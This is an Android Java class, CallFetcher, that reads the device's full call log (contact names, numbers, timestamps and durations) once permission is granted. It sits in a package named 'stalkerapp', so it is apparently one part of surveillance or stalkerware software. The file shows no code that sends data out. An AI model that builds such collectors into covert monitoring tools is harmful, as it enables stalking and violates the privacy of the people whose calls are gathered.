package com.github.saintedlittle.stalkerapp.fetcher;

import static android.provider.CallLog.Calls.CACHED_NAME;
import static android.provider.CallLog.Calls.CONTENT_URI;
import static android.provider.CallLog.Calls.DATE;
import static android.provider.CallLog.Calls.DEFAULT_SORT_ORDER;
import static android.provider.CallLog.Calls.DURATION;
import static android.provider.CallLog.Calls.NUMBER;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;

import androidx.core.content.ContextCompat;

import com.github.saintedlittle.stalkerapp.data.CallData;

import java.util.ArrayList;
import java.util.List;

public class CallFetcher {

    @SuppressLint("Range")
    public static List<CallData> fetchCalls(Context context) {
        List<CallData> callList = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // Permission not granted
            return callList;
        }

        ContentResolver contentResolver = context.getContentResolver();
        String[] projection = {
                CACHED_NAME,
                NUMBER,
                DATE,
                DURATION
        };

        Cursor cursor = contentResolver.query(
                CONTENT_URI,
                projection,
                null,
                null,
                DEFAULT_SORT_ORDER
        );

        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    String caller = cursor.getString(cursor.getColumnIndex(CACHED_NAME));
                    if (caller == null) {
                        caller = cursor.getString(cursor.getColumnIndex(NUMBER));
                    }

                    String phone = cursor.getString(cursor.getColumnIndex(NUMBER));

                    long timestamp = cursor.getLong(cursor.getColumnIndex(DATE));
                    int duration = cursor.getInt(cursor.getColumnIndex(DURATION));

                    CallData callData = new CallData(caller, phone, timestamp, duration);
                    callList.add(callData);
                }
            } finally {
                cursor.close();
            }
        }

        return callList;
    }

}
